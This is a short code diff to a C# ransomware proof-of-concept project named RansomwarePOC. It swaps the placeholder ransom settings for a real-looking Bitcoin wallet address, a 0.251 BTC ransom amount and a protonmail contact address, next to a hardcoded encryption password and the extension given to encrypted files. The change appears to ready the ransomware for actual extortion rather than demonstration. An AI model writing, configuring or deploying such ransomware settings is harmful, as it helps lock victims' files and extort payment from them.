@@ -24,9 +24,9 @@ namespace RansomwarePOC
         private const bool ENCRYPT_PICTURES = true;
         private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
         private const string ENCRYPT_PASSWORD = "Password1";
-        private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
-        private const string BITCOIN_RANSOM_AMOUNT = "1";
-        private const string EMAIL_ADDRESS = "this.email.address@gmail.com";
+        private const string BITCOIN_ADDRESS = "bc1q45hmfk69wd8m2nugarlhnugrss5tcj5ukw82c9";
+        private const string BITCOIN_RANSOM_AMOUNT = "0.251";
+        private const string EMAIL_ADDRESS = "Michaelgrahamks@protonmail.com";
 
         // ----------------------------- END -------------------------------- //
         
